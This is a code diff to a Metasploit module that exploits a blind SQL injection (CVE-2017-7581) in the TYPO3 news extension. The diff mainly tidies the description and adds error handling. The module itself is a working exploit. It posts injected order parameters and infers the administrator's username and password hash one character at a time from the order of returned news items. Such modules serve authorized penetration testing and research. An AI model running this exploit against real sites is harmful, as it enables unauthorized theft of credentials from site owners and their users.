@@ -12,34 +12,35 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'TYPO3 News Module SQL Injection',
       'Description'    => %q{
-         This module exploits a SQL Injection vulnerability In TYPO3 NewsController.php
-         in the news module 5.3.2 and earlier, allows unauthenticated user to execute arbitrary
-         SQL commands via vectors involving overwriteDemand for order and OrderByAllowed.
-         This essentially means an attacker can obtain user credentials hashes.
+        This module exploits a SQL Injection vulnerability In TYPO3 NewsController.php
+        in the news module 5.3.2 and earlier. It allows an unauthenticated user to execute arbitrary
+        SQL commands via vectors involving overwriteDemand and OrderByAllowed. The SQL injection
+        can be used to obtain password hashes for application user accounts. This module has been
+        tested on TYPO3 3.16.0 running news extension 5.0.0.
 
-         This module tries to extract username and password hash of the administrator user.
-         It tries to inject sql and check every letter of a pattern, to see
-         if it belongs to the username or password it tries to alter the ordering of results. If
-         the letter doesn't belong to the word being extracted then all results are inverted
-         (News #2 appears before News #1, so Pattern2 before Pattern1), instead if the letter belongs
-         to the word being extracted then the results are in proper order (News #1 appers before News #2,
-         so Pattern1 before Pattern2)
+        This module tries to extract username and password hash of the administrator user.
+        It tries to inject sql and check every letter of a pattern, to see
+        if it belongs to the username or password it tries to alter the ordering of results. If
+        the letter doesn't belong to the word being extracted then all results are inverted
+        (News #2 appears before News #1, so Pattern2 before Pattern1), instead if the letter belongs
+        to the word being extracted then the results are in proper order (News #1 appears before News #2,
+        so Pattern1 before Pattern2)
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
-          'Marco Rivoli', #MSF code
-          'Charles Fol' # initial discovery, POC
+          'Marco Rivoli', # MSF code
+          'Charles Fol'   # initial discovery, POC
         ],
       'References'     =>
         [
-          [ 'CVE', '2017-7581'  ],
-          [ 'URL', 'http://www.ambionics.io/blog/typo3-news-module-sqli' ], # Advisory
+          ['CVE', '2017-7581'],
+          ['URL', 'http://www.ambionics.io/blog/typo3-news-module-sqli'] # Advisory
         ],
       'Privileged'     => false,
       'Platform'       => ['php'],
       'Arch'           => ARCH_PHP,
-      'Targets'        => [[ 'Automatic', { }]],
+      'Targets'        => [['Automatic', {}]],
       'DisclosureDate' => 'Apr 6 2017',
       'DefaultTarget'  => 0))
 
@@ -90,6 +91,7 @@ class MetasploitModule < Msf::Auxiliary
                       digit_charset,
                       patterns)
     size = size.to_i - offset
+    vprint_status("Retrieving field '#{field}' string (#{size} bytes)...")
     data = blind_size(field,
                       table,
                       condition,
@@ -107,8 +109,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def blind_size(field, table, condition, size, charset,  patterns = {})
-    vprint_status("Retrieving field '#{field}' string (#{size} bytes)...")
-
     str = ""
     for position in 0..size
       for char in charset.split('')
@@ -123,37 +123,53 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def test(payload, patterns = {})
-    res = send_request_cgi({
-      'method'   => 'POST',
-      'uri'      => normalize_uri(target_uri.path,'index.php'),
-      'vars_get' => {
-        'id' => datastore['ID'],
-        'no_cache' => '1'
-       },
-       'vars_post' => {
-         'tx_news_pi1[overwriteDemand][OrderByAllowed]' => payload,
-         'tx_news_pi1[search][maximumDate]' => '', # Not required
-         'tx_news_pi1[overwriteDemand][order]' => payload,
-         'tx_news_pi1[search][subject]' => '',
-         'tx_news_pi1[search][minimumDate]' => '' # Not required
-       }
-    })
-    return res.body.index(patterns[:pattern1]) < res.body.index(patterns[:pattern2])
+    begin
+      res = send_request_cgi({
+        'method'   => 'POST',
+        'uri'      => normalize_uri(target_uri.path,'index.php'),
+        'vars_get' => {
+          'id' => datastore['ID'],
+          'no_cache' => '1'
+        },
+        'vars_post' => {
+          'tx_news_pi1[overwriteDemand][OrderByAllowed]' => payload,
+          'tx_news_pi1[search][maximumDate]' => '', # Not required
+          'tx_news_pi1[overwriteDemand][order]' => payload,
+          'tx_news_pi1[search][subject]' => '',
+          'tx_news_pi1[search][minimumDate]' => '' # Not required
+        }
+      })
+    rescue Rex::ConnectionError, Errno::CONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+    end
+    if res and res.code == 200
+      return res.body.index(patterns[:pattern1]) < res.body.index(patterns[:pattern2])
+    else
+      return false
+    end
   end
 
   def try_autodetect_patterns
     print_status("Trying to automatically determine Pattern1 and Pattern2...")
-    res = send_request_cgi({
-      'method'   => 'POST',
-      'uri'      => normalize_uri(target_uri.path,'index.php'),
-      'vars_get' => {
-        'id' => datastore['ID'],
-        'no_cache' => '1'
-       }
-    })
-    news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]')
-    pattern1 = defined?(news[0]) ? news[0].search('span[@itemprop="headline"]').text : ''
-    pattern2 = defined?(news[1]) ? news[1].search('span[@itemprop="headline"]').text : ''
+    begin
+      res = send_request_cgi({
+        'method'   => 'POST',
+        'uri'      => normalize_uri(target_uri.path,'index.php'),
+        'vars_get' => {
+          'id' => datastore['ID'],
+          'no_cache' => '1'
+        }
+      })
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+      return '', ''
+    end
+
+    if res and res.code == 200
+      news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]')
+      pattern1 = defined?(news[0]) ? news[0].search('span[@itemprop="headline"]').text : ''
+      pattern2 = defined?(news[1]) ? news[1].search('span[@itemprop="headline"]').text : ''
+    end
 
     if pattern1.to_s.eql?('') || pattern2.to_s.eql?('')
       print_status("Couldn't determine Pattern1 and Pattern2 automatically, switching to user speficied values...")
@@ -161,17 +177,15 @@ class MetasploitModule < Msf::Auxiliary
       pattern2 = datastore['PATTERN2']
     end
 
-    print_status("Pattern1: #{pattern1}")
-    print_status("Pattern2: #{pattern2}")
+    print_status("Pattern1: #{pattern1}, Pattern2: #{pattern2}")
     return pattern1, pattern2
   end
 
   def run
     pattern1, pattern2 = try_autodetect_patterns
     if pattern1 == '' or pattern2 == ''
-      print_error("Impossible to determine pattern automatically, aborting...")
+      print_error("Unable to determine pattern, aborting...")
     else
-      print_status("Dumping the username and password hash...")
       dump_the_hash(:pattern1 => pattern1, :pattern2 => pattern2)
     end
   end
